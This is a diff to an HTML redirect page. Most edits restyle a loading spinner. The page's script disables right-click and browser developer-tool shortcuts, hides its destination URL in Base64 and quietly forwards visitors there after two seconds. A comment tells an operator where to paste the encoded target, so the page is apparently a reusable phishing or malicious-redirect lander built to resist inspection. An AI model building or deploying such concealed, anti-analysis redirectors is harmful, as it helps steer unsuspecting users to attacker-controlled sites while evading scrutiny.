@@ -1,57 +1,61 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
 <title>Redirecting...</title>
 
 <style>
     body {
         margin: 0;
         background: #ffffff;
+        height: 100vh;
+        width: 100vw;
         display: flex;
         justify-content: center;
         align-items: center;
-        height: 100vh;
+        overflow: hidden;
     }
 
+    /* Responsive dot spinner */
     .dot-spinner {
-        --size: 70px;
+        --size: clamp(50px, 15vw, 80px);
         width: var(--size);
         height: var(--size);
         position: relative;
     }
 
     .dot-spinner div {
-        width: 10px;
-        height: 10px;
+        width: calc(var(--size) * 0.17);
+        height: calc(var(--size) * 0.17);
         background: #5659a8;
         border-radius: 50%;
         position: absolute;
-        top: calc(50% - 5px);
-        left: calc(50% - 5px);
-        transform-origin: 35px 35px;
-        animation: blink 1.2s infinite ease-in-out;
-        opacity: 0.2;
+        top: 50%;
+        left: 50%;
+        transform-origin: calc(var(--size) / 2) calc(var(--size) / 2);
+        animation: pulse 1.2s infinite ease-in-out;
+        opacity: 0.25;
     }
 
-    .dot-spinner div:nth-child(1) { transform: rotate(0deg) translate(30px); animation-delay: 0s; }
-    .dot-spinner div:nth-child(2) { transform: rotate(45deg) translate(30px); animation-delay: 0.15s; }
-    .dot-spinner div:nth-child(3) { transform: rotate(90deg) translate(30px); animation-delay: 0.3s; }
-    .dot-spinner div:nth-child(4) { transform: rotate(135deg) translate(30px); animation-delay: 0.45s; }
-    .dot-spinner div:nth-child(5) { transform: rotate(180deg) translate(30px); animation-delay: 0.6s; }
-    .dot-spinner div:nth-child(6) { transform: rotate(225deg) translate(30px); animation-delay: 0.75s; }
-    .dot-spinner div:nth-child(7) { transform: rotate(270deg) translate(30px); animation-delay: 0.9s; }
-    .dot-spinner div:nth-child(8) { transform: rotate(315deg) translate(30px); animation-delay: 1.05s; }
+    /* 8 dots around the circle */
+    .dot-spinner div:nth-child(1) { transform: rotate(0deg) translate(calc(var(--size) / 2.5)); animation-delay: 0s; }
+    .dot-spinner div:nth-child(2) { transform: rotate(45deg) translate(calc(var(--size) / 2.5)); animation-delay: 0.15s; }
+    .dot-spinner div:nth-child(3) { transform: rotate(90deg) translate(calc(var(--size) / 2.5)); animation-delay: 0.3s; }
+    .dot-spinner div:nth-child(4) { transform: rotate(135deg) translate(calc(var(--size) / 2.5)); animation-delay: 0.45s; }
+    .dot-spinner div:nth-child(5) { transform: rotate(180deg) translate(calc(var(--size) / 2.5)); animation-delay: 0.6s; }
+    .dot-spinner div:nth-child(6) { transform: rotate(225deg) translate(calc(var(--size) / 2.5)); animation-delay: 0.75s; }
+    .dot-spinner div:nth-child(7) { transform: rotate(270deg) translate(calc(var(--size) / 2.5)); animation-delay: 0.9s; }
+    .dot-spinner div:nth-child(8) { transform: rotate(315deg) translate(calc(var(--size) / 2.5)); animation-delay: 1.05s; }
 
-    @keyframes blink {
+    @keyframes pulse {
         0%, 20% { opacity: 1; }
         50%, 100% { opacity: 0.2; }
     }
 </style>
 
 <script>
-// Disable right click
+// Disable right-click
 document.addEventListener("contextmenu", e => e.preventDefault());
 
 // Disable F12, Ctrl+Shift+I, Ctrl+U, Ctrl+Shift+C
@@ -65,7 +69,7 @@ document.onkeydown = function(e) {
     }
 };
 
-// Sir inserts Base64 here
+// Sir will paste Base64 here
 const encoded = "aHR0cHM6Ly90ZWtvbi5jeW91L2NvbXQv";
 
 // Redirect after 2 seconds
@@ -73,8 +77,8 @@ setTimeout(() => {
     window.location.href = atob(encoded);
 }, 2000);
 </script>
-
 </head>
+
 <body>
     <div class="dot-spinner">
         <div></div><div></div><div></div><div></div>
